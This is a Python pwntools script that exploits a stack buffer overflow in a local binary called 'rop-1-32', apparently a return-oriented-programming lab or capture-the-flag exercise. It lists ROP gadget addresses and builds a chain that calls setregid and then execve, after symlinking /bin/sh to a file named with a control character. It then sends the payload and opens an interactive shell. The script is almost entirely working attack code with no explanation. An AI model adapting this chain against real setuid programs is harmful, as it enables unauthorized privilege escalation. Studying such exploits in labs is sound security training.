#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-1-32')

buf = "A" * 0x88 + "BBBB"


#0x080483c0  execve@plt
#0x080483d0  prctl@plt
#0x080483e0  setregid@plt


execv = p32(0x080483c0)
setregid = p32(0x080483e0)



"""
0x080485f7 : pop ebp ; lea esp, [ecx - 4] ; ret
0x0804865b : pop ebp ; ret
0x08048658 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804836d : pop ebx ; ret
0x080485f6 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804865a : pop edi ; pop ebp ; ret
0x08048659 : pop esi ; pop edi ; pop ebp ; ret
"""


pop_pop_ret = p32(0x0804865a)

buf += setregid
buf += pop_pop_ret
buf += p32(50000)
buf += p32(50000)

string = p32(0x80485aa)

if os.path.exists("\x01"):
    os.unlink("\x01")

os.symlink("/bin/sh", "\x01")

buf += execv
buf += p32(0)
buf += string
buf += p32(0)
buf += p32(0)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
